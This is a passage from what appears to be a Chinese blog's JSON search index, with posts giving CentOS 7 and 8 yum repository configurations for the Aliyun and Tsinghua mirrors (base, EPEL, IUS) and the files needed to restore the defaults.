0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.aliyun.com/ius/RPM-GPG-KEY-IUS-7\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS","ius"]},{"title":"【国内镜像】CentOS 7 ius 清华镜像","url":"/mirror/centos-7-ius-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nIUS（Inline with Upstream Stable）是一个社区项目，它旨在为 Linux 企业发行版提供可选软件的最新版 RPM 软件包。\n\n## 添加ius源\n\n```txt /etc/yum.repos.d/ius.repo\n[ius]\nname = IUS for Enterprise Linux 7 - $basearch\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/ius/7/$basearch/\nenabled = 1\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/ius/RPM-GPG-KEY-IUS-7\n\n[ius-debuginfo]\nname = IUS for Enterprise Linux 7 - $basearch - Debug\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/ius/7/$basearch/debug/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/ius/RPM-GPG-KEY-IUS-7\n\n[ius-source]\nname = IUS for Enterprise Linux 7 - Source\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/ius/7/src/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/ius/RPM-GPG-KEY-IUS-7\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS","ius"]},{"title":"【国内镜像】CentOS 7 清华镜像","url":"/mirror/centos-7-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\n## 替换镜像源\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n\n[base]\nname=CentOS-$releasever - Base\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/updates/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7\n\n\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7\n\n\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/centosplus/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS"]},{"title":"【国内镜像】CentOS 8 阿里云镜像","url":"/mirror/centos-8-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\n## 替换镜像源\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=https://mirrors.aliyun.com/centos/$releasever/BaseOS/$basearch/os/\n        http://mirrors.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/\ngpgcheck=1\ngpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=https://mirrors.aliyun.com/centos/$releasever/extras/$basearch/os/\n        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/os/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/os/\ngpgcheck=1\ngpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=https://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/os/\n        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/\ngpgcheck=1\nenabled=0\ngpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official\n\n[PowerTools]\nname=CentOS-$releasever - PowerTools - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=https://mirrors.aliyun.com/centos/$releasever/PowerTools/$basearch/os/\n        http://mirrors.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/\ngpgcheck=1\nenabled=0\ngpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official\n\n\n[AppStream]\nname=CentOS-$releasever - AppStream - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=https://mirrors.aliyun.com/centos/$releasever/AppStream/$basearch/os/\n        http://mirrors.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/\ngpgcheck=1\ngpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official\n```\n\n<!-- more -->\n\n非阿里云ECS用户会出现 Couldn't resolve host 'mirrors.cloud.aliyuncs.com' 信息，不影响使用。用户也可自行修改相关配置: eg:\n\n```shell\nsed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo\n```\n\n## 恢复\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[BaseOS]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=BaseOS&infra=$infra\n#baseurl=http://mirror.centos.org/$contentdir/$releasever/BaseOS/$basearch/os/\ngpgcheck=1\nenabled=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS"]},{"title":"【国内镜像】CentOS 8 epel 阿里云镜像","url":"/mirror/centos-8-epel-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nEPEL(Extra Packages for Enterprise Linux)是由Fedora Special Interest Group维护的Enterprise Linux（RHEL、CentOS）中经 常用到的包。\n\n## 添加epel源\n\n```txt /etc/yum.repos.d/epel.repo\n[epel]\nname=Extra Packages for Enterprise Linux $releasever - $basearch\nbaseurl=https://mirrors.aliyun.com/epel/$releasever/Everything/$basearch\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux $releasever - $basearch - Debug\nbaseurl=https://mirrors.aliyun.com/epel/$releasever/Everything/$basearch/debug\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8\ngpgcheck=1\n\n[epel-source]\nname=Extra Packages for Enterprise Linux $releasever - $basearch - Source\nbaseurl=https://mirrors.aliyun.com/epel/$releasever/Everything/SRPMS\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8\ngpgcheck=1\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS","epel"]},{"title":"【国内镜像】CentOS 8 epel 清华镜像","url":"/mirror/centos-8-epel-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nEPEL(Extra Packages for Enterprise Linux)是由Fedora Special Interest Group维护的Enterprise Linux（RHEL、CentOS）中经 常用到的包。\n\n## 添加epel源\n\n```txt /etc/yum.repos.d/epel.repo\n[epel]\nname=Extra Packages for Enterprise Linux 8 - $basearch\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/8/$basearch\nfailovermethod=priority\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux 8 - $basearch - Debug\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/8/$basearch/debug\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8\ngpgcheck=1\n\n[epel-source]\nname=Extra Packages for Enterprise Linux 8 - $basearch - Source\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/8/SRPMS\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8\ngpgcheck=1\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS","epel"]},{"title":"【国内镜像】CentOS 8 清华镜像","url":"/mirror/centos-8-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\n## 替换镜像源\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n\n\n[BaseOS]\nname=CentOS-$releasever - Base\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/BaseOS/$basearch/os/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=BaseOS&infra=$infra\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n\n[AppStream]\nname=CentOS-$releasever - AppStream\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/AppStream/$basearch/os/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=AppStream&infra=$infra\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n\n[PowerTools]\nname=CentOS-$releasever - PowerTools\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/PowerTools/$basearch/os/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=PowerTools&infra=$infra\nenabled=0\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch/os/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n\n\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/centosplus/$basearch/os/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt 